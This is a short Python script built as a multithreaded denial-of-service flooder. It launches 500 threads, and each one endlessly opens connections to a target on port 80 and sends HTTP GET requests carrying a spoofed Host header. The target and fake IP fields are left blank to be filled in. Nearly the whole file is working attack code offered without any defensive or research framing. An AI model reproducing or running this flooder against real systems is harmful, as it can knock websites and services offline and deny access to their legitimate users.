import threading
import socket

# target ip
target = ''
port = 80

# fake ip header
fake_ip = ''

already_connected = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'),
                 (target, port))
        s.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        # Option: print out how many connection/attacks we have issued so far

        # global keyword allows you to modify the variable outside of the current scope.
        # It is used to create a global variable and make changes to the variable
        # in a local context.

        # global already_connected
        # already_connected += 1
        # if already_connected % 500 == 0:
        #     print(already_connected)


for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
